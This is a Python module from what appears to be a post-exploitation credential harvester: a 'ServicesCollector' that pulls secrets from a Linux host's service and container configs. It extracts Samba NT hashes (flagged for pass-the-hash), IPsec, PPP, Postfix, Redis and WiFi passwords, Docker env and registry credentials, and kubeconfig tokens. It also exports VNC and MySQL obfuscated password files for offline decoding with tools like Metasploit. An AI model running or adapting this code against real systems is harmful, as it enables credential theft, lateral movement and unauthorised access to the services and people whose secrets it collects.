"""High-value /etc service configs, container/K8s configs and encoded cred
stores that the WebConfig collector does not cover. Each has its own format, so
each gets a small dedicated extractor instead of a generic keyword grep.

Covered:
  Samba        /etc/samba/smbpasswd, /etc/samba/secrets.tdb (pointer)
  IPsec        /etc/ipsec.secrets
  PPP          /etc/ppp/chap-secrets, /etc/ppp/pap-secrets
  Postfix      /etc/postfix/sasl_passwd
  Redis        /etc/redis/redis.conf (requirepass / masterauth)
  WiFi         /etc/wpa_supplicant/*.conf, /etc/NetworkManager/system-connections/*
  MySQL        ~/.mylogin.cnf (obfuscated, trivially decryptable - pointer+export)
  VNC          ~/.vnc/passwd (fixed-key DES - pointer+export)
  cloud-init   /var/lib/cloud/instance/user-data.txt, /var/lib/cloud/.../user-data
  Docker       /var/lib/docker/containers/*/config.v2.json (env creds)
               ~/.docker/config.json (registry auth)
  K8s          /etc/kubernetes/*.conf, ~/.kube/config
  Dumps        *.sql / *.bak / *.db under web+home roots (pointer only)
"""
from __future__ import annotations

import base64
import json
import os
import re
from typing import List

from core.secret import Secret, Status
from core.tools import (read_text, read_bytes, home_dirs, user_of_home,
                        find_files, is_nonsecret_value)
from .base import BaseCollector

_CHAP_RE = re.compile(r"^\s*(\S+)\s+(\S+)\s+(\S+)")          # user server secret
_REDIS_RE = re.compile(r"^\s*(requirepass|masterauth)\s+(\S+)", re.I)
_WPA_PSK_RE = re.compile(r"""^\s*(?:psk|password)\s*=\s*["']?([^"'\n]+)""", re.I)
_WPA_SSID_RE = re.compile(r"""^\s*ssid\s*=\s*["']?([^"'\n]+)""", re.I)
_IPSEC_RE = re.compile(r"""(?:PSK|secret)\s+["']([^"']+)["']""", re.I)


class ServicesCollector(BaseCollector):
    name = "Services"
    description = "Samba/IPsec/PPP/Redis/WiFi/Docker/K8s/cloud-init + mylogin/vnc"

    def collect(self) -> List[Secret]:
        f: List[Secret] = []
        f += self._samba()
        f += self._ipsec()
        f += self._ppp()
        f += self._postfix()
        f += self._redis()
        f += self._wifi()
        f += self._mylogin()
        f += self._vnc()
        f += self._cloudinit()
        f += self._docker()
        f += self._kube()
        f += self._dumps()
        return f

    # ---- Samba ----
    def _samba(self) -> List[Secret]:
        out = []
        txt = read_text("/etc/samba/smbpasswd")
        if txt:
            for line in txt.splitlines():
                parts = line.split(":")
                if len(parts) >= 4 and parts[0] and not line.startswith("#"):
                    # user:uid:LMhash:NThash:...
                    out.append(Secret("Services", parts[0], parts[3],
                                      Status.HASH, secret_type="nthash",
                                      target="/etc/samba/smbpasswd",
                                      notes="samba NT hash (pass-the-hash)"))
        if os.path.isfile("/etc/samba/secrets.tdb"):
            out.append(Secret("Services", "", "/etc/samba/secrets.tdb",
                              Status.INFO, secret_type="tdb",
                              target="/etc/samba/secrets.tdb",
                              notes="machine acct / domain secrets; tdbdump to read"))
        return out

    # ---- IPsec ----
    def _ipsec(self) -> List[Secret]:
        out = []
        for p in ("/etc/ipsec.secrets", "/etc/strongswan.conf"):
            txt = read_text(p)
            if not txt:
                continue
            for m in _IPSEC_RE.finditer(txt):
                out.append(Secret("Services", "", m.group(1), Status.CLEARTEXT,
                                  secret_type="psk", target=p, notes="IPsec PSK"))
        # include referenced files from ipsec.secrets.d
        for f in find_files(["/etc/ipsec.d"], re.compile(r".*\.secrets$"), max_depth=2):
            txt = read_text(f)
            if txt:
                for m in _IPSEC_RE.finditer(txt):
                    out.append(Secret("Services", "", m.group(1), Status.CLEARTEXT,
                                      secret_type="psk", target=f, notes="IPsec PSK"))
        return out

    # ---- PPP chap/pap-secrets ----
    def _ppp(self) -> List[Secret]:
        out = []
        for p in ("/etc/ppp/chap-secrets", "/etc/ppp/pap-secrets"):
            txt = read_text(p)
            if not txt:
                continue
            for line in txt.splitlines():
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                m = _CHAP_RE.match(line)
                if m:
                    out.append(Secret("Services", m.group(1).strip('"'),
                                      m.group(3).strip('"'), Status.CLEARTEXT,
                                      secret_type="password", target=p,
                                      notes="PPP secret (server=%s)" % m.group(2)))
        return out

    # ---- Postfix SASL ----
    def _postfix(self) -> List[Secret]:
        out = []
        for p in ("/etc/postfix/sasl_passwd", "/etc/postfix/sasl/sasl_passwd"):
            txt = read_text(p)
            if not txt:
                continue
            for line in txt.splitlines():
                line = line.strip()
                if not line or line.startswith("#") or " " not in line:
                    continue
                host, cred = line.split(None, 1)
                user, _, pw = cred.partition(":")
                out.append(Secret("Services", user, pw, Status.CLEARTEXT,
                                  secret_type="password", target=p,
                                  notes="postfix SASL relay (%s)" % host))
        return out

    # ---- Redis ----
    def _redis(self) -> List[Secret]:
        out = []
        for p in ("/etc/redis/redis.conf", "/etc/redis.conf"):
            txt = read_text(p)
            if not txt:
                continue
            for line in txt.splitlines():
                m = _REDIS_RE.match(line)
                if m and not is_nonsecret_value(m.group(2)):
                    out.append(Secret("Services", "", m.group(2), Status.CLEARTEXT,
                                      secret_type="password", target=p,
                                      notes="redis %s" % m.group(1).lower()))
        return out

    # ---- WiFi PSK ----
    def _wifi(self) -> List[Secret]:
        out = []
        roots = ["/etc/wpa_supplicant", "/etc/NetworkManager/system-connections"]
        for f in find_files(roots, re.compile(r".*"), max_depth=2, max_hits=500):
            txt = read_text(f)
            if not txt:
                continue
            ssid = ""
            for line in txt.splitlines():
                sm = _WPA_SSID_RE.match(line) or re.match(r"\s*ssid=(.+)", line)
                if sm:
                    ssid = sm.group(1).strip().strip('"')
                pm = _WPA_PSK_RE.match(line)
                if pm and not is_nonsecret_value(pm.group(1)):
                    out.append(Secret("Services", ssid, pm.group(1),
                                      Status.CLEARTEXT, secret_type="wifi-psk",
                                      target=f, notes="WiFi PSK (ssid=%s)" % ssid))
        return out

    # ---- MySQL ~/.mylogin.cnf (obfuscated, AES; export for myloginpy/mysql_config_editor) ----
    def _mylogin(self) -> List[Secret]:
        out = []
        for h in home_dirs():
            p = os.path.join(h, ".mylogin.cnf")
            data = read_bytes(p, max_bytes=64 * 1024)
            if data:
                out.append(Secret("Services", user_of_home(h), p, Status.INFO,
                                  secret_type="mylogin-cnf", target=p,
                                  notes="obfuscated MySQL login; decode: myloginpy / mysql_config_editor",
                                  material=base64.b64encode(data).decode()))
        return out

    # ---- VNC ~/.vnc/passwd (fixed-key DES; export for vncpwd) ----
    def _vnc(self) -> List[Secret]:
        out = []
        for h in home_dirs():
            for rel in (".vnc/passwd", ".vnc/passwdfile"):
                p = os.path.join(h, rel)
                data = read_bytes(p, max_bytes=256)
                if data:
                    out.append(Secret("Services", user_of_home(h), p, Status.INFO,
                                      secret_type="vnc-passwd", target=p,
                                      notes="VNC fixed-key DES; decode: vncpwd / Metasploit",
                                      material=base64.b64encode(data).decode()))
        return out

    # ---- cloud-init user-data ----
    def _cloudinit(self) -> List[Secret]:
        out = []
        paths = ["/var/lib/cloud/instance/user-data.txt",
                 "/var/lib/cloud/instance/user-data.txt.i"]
        for f in find_files(["/var/lib/cloud/instances"],
                            re.compile(r"user-data.*"), max_depth=3):
            paths.append(f)
        for p in paths:
            txt = read_text(p, max_bytes=256 * 1024)
            if not txt:
                continue
            for line in txt.splitlines():
                s = line.strip()
                lm = re.match(r"(?:-\s*)?(?:passwd|password|hashed_passwd)\s*:\s*(.+)", s, re.I)
                if lm:
                    val = lm.group(1).strip().strip("'\"")
                    if val and not is_nonsecret_value(val):
                        st = Status.HASH if val.startswith("$") else Status.CLEARTEXT
                        out.append(Secret("Services", "", val, st,
                                          secret_type="password", target=p,
                                          notes="cloud-init user-data"))
        return out

    # ---- Docker ----
    def _docker(self) -> List[Secret]:
        out = []
        # per-container env (often holds DB/app creds)
        for f in find_files(["/var/lib/docker/containers"],
                            re.compile(r"config\.v2\.json$"), max_depth=2,
                            max_hits=1000):
            txt = read_text(f, max_bytes=512 * 1024)
            if not txt:
                continue
            try:
                cfg = json.loads(txt)
                env = (cfg.get("Config") or {}).get("Env") or []
            except Exception:
                env = re.findall(r'"([A-Z0-9_]*(?:PASS|SECRET|TOKEN|KEY)[A-Z0-9_]*=[^"]+)"', txt, re.I)
            for e in env:
                if "=" not in e:
                    continue
                k, v = e.split("=", 1)
                if re.search(r"PASS|SECRET|TOKEN|KEY|CRED", k, re.I) and not is_nonsecret_value(v):
                    out.append(Secret("Services", "", f"{k}={v}", Status.CLEARTEXT,
                                      secret_type="container-env", target=f,
                                      notes="docker container env"))
        # registry auth (~/.docker/config.json : base64 user:pass)
        for h in home_dirs():
            p = os.path.join(h, ".docker", "config.json")
            txt = read_text(p)
            if not txt:
                continue
            try:
                auths = (json.loads(txt).get("auths") or {})
            except Exception:
                auths = {}
            for reg, d in auths.items():
                b = d.get("auth")
                if b:
                    try:
                        dec = base64.b64decode(b).decode("utf-8", "ignore")
                    except Exception:
                        dec = ""
                    u, _, pw = dec.partition(":")
                    if pw:
                        out.append(Secret("Services", u, pw, Status.CLEARTEXT,
                                          secret_type="password", target=reg,
                                          notes="docker registry auth"))
        return out

    # ---- Kubernetes ----
    def _kube(self) -> List[Secret]:
        out = []
        paths = []
        for f in find_files(["/etc/kubernetes"], re.compile(r".*\.conf$"), max_depth=2):
            paths.append(f)
        for h in home_dirs():
            paths.append(os.path.join(h, ".kube", "config"))
        for p in paths:
            txt = read_text(p, max_bytes=512 * 1024)
            if not txt:
                continue
            for m in re.finditer(r"(token|client-key-data|password)\s*:\s*(\S+)", txt, re.I):
                val = m.group(2).strip().strip("'\"")
                if val and not is_nonsecret_value(val):
                    out.append(Secret("Services", "", val[:200],
                                      Status.CLEARTEXT, secret_type="k8s-cred",
                                      target=p, notes="kubeconfig %s" % m.group(1)))
        return out

    # ---- DB/backup dumps (pointer only - grep manually) ----
    def _dumps(self) -> List[Secret]:
        out = []
        roots = ["/var/www", "/srv", "/opt", "/home", "/root", "/tmp", "/var/backups"]
        rx = re.compile(r".*\.(sql|bak|dump|db|sqlite3?)$", re.I)
        for f in find_files(roots, rx, max_depth=4, max_hits=400):
            try:
                sz = os.path.getsize(f)
            except Exception:
                sz = 0
            out.append(Secret("Services", "", f, Status.INFO,
                              secret_type="dump-file", target=f,
                              notes="DB/backup dump (%d KB); grep for creds" % (sz // 1024)))
        return out
